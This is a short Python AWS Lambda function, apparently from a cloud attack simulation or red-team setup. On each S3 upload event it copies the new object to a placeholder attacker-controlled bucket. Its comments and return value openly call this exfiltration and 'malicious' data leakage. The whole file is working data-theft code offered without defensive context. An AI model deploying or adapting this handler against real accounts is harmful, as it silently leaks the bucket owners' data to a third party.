import boto3

s3 = boto3.client("s3")

def handler(event, context):
    # Exfiltrate data to attacker bucket
    attacker_bucket = "ATTACKER-BUCKET-NAME"  # replace with your var.attacker_bucket
    for record in event['Records']:
        source_bucket = record['s3']['bucket']['name']
        object_key = record['s3']['object']['key']
        copy_source = {'Bucket': source_bucket, 'Key': object_key}
        
        s3.copy_object(Bucket=attacker_bucket, Key=object_key, CopySource=copy_source)
        print(f"Exfiltrated {object_key} to attacker bucket {attacker_bucket}")
    return {"status": "malicious", "action": "data leakage"}
